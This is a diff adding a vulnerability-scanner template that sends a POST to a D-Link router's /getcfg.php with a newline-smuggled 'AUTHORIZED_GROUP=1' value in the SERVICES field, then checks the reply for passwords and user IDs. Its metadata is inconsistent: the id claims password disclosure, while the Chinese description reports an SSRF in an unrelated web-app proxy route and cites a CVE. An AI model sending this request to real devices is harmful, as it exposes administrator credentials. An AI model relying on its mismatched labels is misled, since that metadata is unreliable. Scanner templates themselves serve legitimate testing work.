@@ -1,0 +1,31 @@
+id: d-link-dir-852-password-disclosure
+
+info:
+  name: "D-Link DIR-852 apps 组件 SSRF 漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    apps/sim/app/api/proxy/route.ts 和 apps/sim/app/api/proxy/image/route.ts 组件中的 GET 函数未实施参数过滤机制，允许攻击者通过构造恶意请求触发服务器端请求伪造（SSRF）漏洞。
+  reference:
+  - CVE-2025-10093
+  tags: D-Link
+
+http:
+- raw:
+  - |
+    POST /getcfg.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+    SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+      - 'password'
+      - 'userid'
+      - 'uid'
+    condition: and
